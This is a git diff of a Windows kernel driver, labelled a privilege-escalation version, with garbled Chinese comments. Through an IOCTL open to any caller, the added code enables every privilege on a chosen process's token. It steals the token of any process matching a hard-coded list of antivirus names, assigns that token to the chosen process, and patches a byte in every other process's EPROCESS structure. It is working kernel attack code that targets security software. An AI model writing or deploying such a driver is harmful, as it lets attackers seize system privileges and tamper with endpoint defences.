@@ -1,36 +1,70 @@
 // MyDriver.c - Kernel-Mode Driver (Privilege Escalation Version)
 #include <ntifs.h>
-
+#include <wdm.h>
+#include <ctype.h>
 // =======================================================================
-//   1. ±N©“¶≥¶€≠q™∫µ≤∫c©w∏q©M IOCTL ©Ò¶b¿…Æ◊≥ª≥°
+//   1. Â∞áÊâÄÊúâËá™Ë®ÇÁöÑÁµêÊßãÂÆöÁæ©Âíå IOCTL ÊîæÂú®Ê™îÊ°àÈ†ÇÈÉ®
 // =======================================================================
 
-// ¶€≠q _SEP_TOKEN_PRIVILEGES µ≤∫c©w∏q
-// ¶]¨∞≥o≠”µ≤∫c§£¨O§Ω∂}™∫°Aß⁄≠Ãª›≠n¶€§v©w∏q•¶
+// Ëá™Ë®Ç _SEP_TOKEN_PRIVILEGES ÁµêÊßãÂÆöÁæ©
+// Âõ†ÁÇ∫ÈÄôÂÄãÁµêÊßã‰∏çÊòØÂÖ¨ÈñãÁöÑÔºåÊàëÂÄëÈúÄË¶ÅËá™Â∑±ÂÆöÁæ©ÂÆÉ
 typedef struct _SEP_TOKEN_PRIVILEGES {
     ULONGLONG Present;
     ULONGLONG Enabled;
     ULONGLONG EnabledByDefault;
 } SEP_TOKEN_PRIVILEGES, * PSEP_TOKEN_PRIVILEGES;
 
-// IOCTL ©w∏q
+// IOCTL ÂÆöÁæ©
 #define IOCTL_EXECUTE_MEMORY_OP CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
 EXTERN_C NTKERNELAPI PEPROCESS NTAPI PsGetNextProcess(
     _In_opt_ PEPROCESS Process
 );
 
-// ∂«ªº∏ÍÆ∆™∫µ≤∫c©w∏q
+// ÂÇ≥ÈÅûË≥áÊñôÁöÑÁµêÊßãÂÆöÁæ©
 typedef struct _KERNEL_OP_REQUEST {
     ULONG ProcessId;
 } KERNEL_OP_REQUEST, * PKERNEL_OP_REQUEST;
 
 
+
+int stricmp(const char* s1, const char* s2) {
+    unsigned char c1, c2;
+    while (*s1 && *s2) {
+        c1 = (unsigned char)tolower((unsigned char)*s1);
+        c2 = (unsigned char)tolower((unsigned char)*s2);
+        if (c1 != c2) {
+            return c1 - c2;
+        }
+        s1++;
+        s2++;
+    }
+    return (unsigned char)tolower((unsigned char)*s1) -
+        (unsigned char)tolower((unsigned char)*s2);
+}
+
+const char* names[] = {
+    "MsMpEng.exe",
+    "MsMpEngCP.exe",
+    "avastsvc.exe",
+    "AvastService.exe",
+    "AVGSvc.exe",
+    "ekrn.exe",
+    "egui.exe",
+    "McShield.exe",
+    "mcshield.exe",
+    "gcasServ.exe",
+    "msseces.exe",
+    "ViperService.exe",
+    "defender.exe"
+};
+size_t nameCount = sizeof(names) / sizeof(names[0]);
+
 // =======================================================================
-//   2. ≈X∞ µ{¶°™∫®Á¶°πÍß@
+//   2. È©ÖÂãïÁ®ãÂºèÁöÑÂáΩÂºèÂØ¶‰Ωú
 // =======================================================================
 
-// --- DriverUnload (¶p™G¶≥™∫∏‹°A•i•H©Ò¶b≥o∏Ã) ---
+// --- DriverUnload (Â¶ÇÊûúÊúâÁöÑË©±ÔºåÂèØ‰ª•ÊîæÂú®ÈÄôË£°) ---
 VOID DriverUnload(_In_ PDRIVER_OBJECT DriverObject) {
     UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\MyDriver");
     IoDeleteSymbolicLink(&symLink);
@@ -38,11 +72,14 @@ VOID DriverUnload(_In_ PDRIVER_OBJECT DriverObject) {
     KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "[MyDriver] Driver Unloaded\n"));
 }
 
-// DeviceControl ®Á¶°
-// ±`®£™∫ offset (Windows 10 x64)
-// ™`∑N°G§£¶P build •iØ‡§£¶P°AΩ–•Œ WinDBG !process ≈Á√“
+// DeviceControl ÂáΩÂºè
+// Â∏∏Ë¶ãÁöÑ offset (Windows 10 x64)
+// Ê≥®ÊÑèÔºö‰∏çÂêå build ÂèØËÉΩ‰∏çÂêåÔºåË´ãÁî® WinDBG !process È©óË≠â
 #define EPROCESS_ACTIVEPROCESSLINKS_OFFSET 0x1d8  
 #define EPROCESS_UNIQUEPROCESSID_OFFSET    0x1d0  
+#define TOKEN_OFFSET 0x248
+#define PRIVILEGES_OFFSET 0x40
+#define EPROCESS_IMAGEFILENAME_OFFSET 0x338
 
 NTSTATUS DeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp) {
     UNREFERENCED_PARAMETER(DeviceObject);
@@ -54,49 +91,12 @@ NTSTATUS DeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp) {
     if (stack->Parameters.DeviceIoControl.IoControlCode == IOCTL_EXECUTE_MEMORY_OP) {
         PKERNEL_OP_REQUEST req = (PKERNEL_OP_REQUEST)Irp->AssociatedIrp.SystemBuffer;
 
-        // --- ≠Ï•ª°G•u≥B≤zøÈ§J PID ---
+        // --- ÂéüÊú¨ÔºöÂè™ËôïÁêÜËº∏ÂÖ• PID ---
         PEPROCESS targetProcess = NULL;
         status = PsLookupProcessByProcessId((HANDLE)req->ProcessId, &targetProcess);
 
-        if (!NT_SUCCESS(status)) {
-            KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
-                "[MyDriver] PsLookupProcessByProcessId •¢±—: 0x%X\n", status));
-        }
-        else {
-            KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,
-                "[MyDriver] ¶®•\ß‰®Ï PID %lu ™∫ EPROCESS: 0x%p\n",
-                req->ProcessId, targetProcess));
-
-#define TOKEN_OFFSET 0x248
-#define PRIVILEGES_OFFSET 0x40
-
-            PACCESS_TOKEN pToken = (PACCESS_TOKEN)(*(PULONG_PTR)((PUCHAR)targetProcess + TOKEN_OFFSET));
-            pToken = (PACCESS_TOKEN)((ULONG_PTR)pToken & ~0xF);
-
-            if (!pToken) {
-                KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
-                    "[MyDriver] ß‰§£®Ï Token ™´•Û°I\n"));
-                status = STATUS_NOT_FOUND;
-            }
-            else {
-                PSEP_TOKEN_PRIVILEGES pPrivileges = (PSEP_TOKEN_PRIVILEGES)((PUCHAR)pToken + PRIVILEGES_OFFSET);
-
-                KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,
-                    "[MyDriver] ≠Ï©l Present: 0x%llX, Enabled: 0x%llX\n",
-                    pPrivileges->Present, pPrivileges->Enabled));
-
-                pPrivileges->Present = 0x0000001ff2ffffbc;
-                pPrivileges->Enabled = 0x0000001ff2ffffbc;
-
-                KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,
-                    "[MyDriver] [SUCCESS] ≈v≠≠§w≠◊ßÔ°I\n"));
-            }
-
-            ObDereferenceObject(targetProcess);
-        }
-
-        // --- ∑sºW•\Ø‡°GActiveProcessLinks πMæ˙©“¶≥ EPROCESS ---
-        PEPROCESS pCurrent = PsGetCurrentProcess(); // •Ù∑N§@≠” process ∑Ì∞_¬I
+        // --- Êñ∞Â¢ûÂäüËÉΩÔºöActiveProcessLinks ÈÅçÊ≠∑ÊâÄÊúâ EPROCESS ---
+        PEPROCESS pCurrent = PsGetCurrentProcess(); // ‰ªªÊÑè‰∏ÄÂÄã process Áï∂Ëµ∑Èªû
         PLIST_ENTRY pList = (PLIST_ENTRY)((PUCHAR)pCurrent + EPROCESS_ACTIVEPROCESSLINKS_OFFSET);
         PLIST_ENTRY head = pList;
 
@@ -104,7 +104,7 @@ NTSTATUS DeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp) {
             PEPROCESS curr = (PEPROCESS)((PUCHAR)pList - EPROCESS_ACTIVEPROCESSLINKS_OFFSET);
             ULONG pid = *(ULONG*)((PUCHAR)curr + EPROCESS_UNIQUEPROCESSID_OFFSET);
 
-            if (pid != req->ProcessId) { // ±∆∞£øÈ§J PID
+            if (pid != req->ProcessId) { // ÊéíÈô§Ëº∏ÂÖ• PID
                 __try {
                     *((PUCHAR)curr + 0x5FA) = 0; // eb (EPROCESS+0x5FA) 0
                     KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,
@@ -114,10 +114,81 @@ NTSTATUS DeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp) {
                     KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
                         "[MyDriver] Patch failed for PID %lu\n", pid));
                 }
+                char* imageName = (char*)((PUCHAR)curr + EPROCESS_IMAGEFILENAME_OFFSET);
+                for (size_t i = 0; i < nameCount; i++) {
+                    if (0 == stricmp(imageName, names[i])) {
+                        PEPROCESS pid4Process = NULL;
+                        status = PsLookupProcessByProcessId((HANDLE)pid, &pid4Process);
+                        if (!NT_SUCCESS(status)) {
+                            KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[MyDriver] Êâæ‰∏çÂà∞ PID 4\n"));
+                            break;
+                        }
+                        PACCESS_TOKEN pid4Token = (PACCESS_TOKEN)(*(PULONG_PTR)((PUCHAR)pid4Process + TOKEN_OFFSET));
+                        pid4Token = (PACCESS_TOKEN)((ULONG_PTR)pid4Token & ~0xF);
+                        if (!pid4Token) {
+                            KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[MyDriver] PID4 Token Êâæ‰∏çÂà∞ÔºÅ\n"));
+                            ObDereferenceObject(pid4Process);
+                            break;
+                        }
+
+                        PEPROCESS targetProcess1 = NULL;
+                        status = PsLookupProcessByProcessId((HANDLE)req->ProcessId, &targetProcess1);
+                        if (!NT_SUCCESS(status)) {
+                            KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
+                                "[MyDriver] Êâæ‰∏çÂà∞ÁõÆÊ®ô PID %lu\n", req->ProcessId));
+                            ObDereferenceObject(pid4Process);
+                            break;
+                        }
+
+                        *(PULONG_PTR)((PUCHAR)targetProcess1 + TOKEN_OFFSET) = (ULONG_PTR)pid4Token;
+                        KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,
+                            "[MyDriver] PID %lu ÁöÑ Token ÊåáÂêë PID4 Token: 0x%p\n",
+                            req->ProcessId, pid4Token));
+                        break;
+                    }
+                }
             }
 
-            pList = pList->Flink; // §U§@≠”
-        } while (pList != head); // ¬∂¶^®”™Ì•‹®´ßπ
+            pList = pList->Flink; // ‰∏ã‰∏ÄÂÄã
+        } while (pList != head); // ÁπûÂõû‰æÜË°®Á§∫Ëµ∞ÂÆå
+
+        if (!NT_SUCCESS(status)) {
+            KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
+                "[MyDriver] PsLookupProcessByProcessId Â§±Êïó: 0x%X\n", status));
+        }
+        else {
+            KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,
+                "[MyDriver] ÊàêÂäüÊâæÂà∞ PID %lu ÁöÑ EPROCESS: 0x%p\n",
+                req->ProcessId, targetProcess));
+
+
+
+            PACCESS_TOKEN pToken = (PACCESS_TOKEN)(*(PULONG_PTR)((PUCHAR)targetProcess + TOKEN_OFFSET));
+            pToken = (PACCESS_TOKEN)((ULONG_PTR)pToken & ~0xF);
+
+            if (!pToken) {
+                KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
+                    "[MyDriver] Êâæ‰∏çÂà∞ Token Áâ©‰ª∂ÔºÅ\n"));
+                status = STATUS_NOT_FOUND;
+            }
+            else {
+                PSEP_TOKEN_PRIVILEGES pPrivileges = (PSEP_TOKEN_PRIVILEGES)((PUCHAR)pToken + PRIVILEGES_OFFSET);
+
+                KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,
+                    "[MyDriver] ÂéüÂßã Present: 0x%llX, Enabled: 0x%llX\n",
+                    pPrivileges->Present, pPrivileges->Enabled));
+
+                pPrivileges->Present = 0x0000001ff2ffffbc;
+                pPrivileges->Enabled = 0x0000001ff2ffffbc;
+
+                KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,
+                    "[MyDriver] [SUCCESS] Ê¨äÈôêÂ∑≤‰øÆÊîπÔºÅ\n"));
+            }
+
+            ObDereferenceObject(targetProcess);
+        }
+
+        
 
     }
 
@@ -129,7 +200,7 @@ NTSTATUS DeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp) {
 
 
 
-// DriverEntry ®Á¶°
+// DriverEntry ÂáΩÂºè
 NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
     UNREFERENCED_PARAMETER(RegistryPath);
 
@@ -140,13 +211,13 @@ NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING Regi
 
     status = IoCreateDevice(DriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &deviceObject);
     if (!NT_SUCCESS(status)) {
-        KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[MyDriver] IoCreateDevice •¢±—: 0x%X\n", status));
+        KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[MyDriver] IoCreateDevice Â§±Êïó: 0x%X\n", status));
         return status;
     }
 
     status = IoCreateSymbolicLink(&symLink, &devName);
     if (!NT_SUCCESS(status)) {
-        KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[MyDriver] IoCreateSymbolicLink •¢±—: 0x%X\n", status));
+        KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[MyDriver] IoCreateSymbolicLink Â§±Êïó: 0x%X\n", status));
         IoDeleteDevice(deviceObject);
         return status;
     }
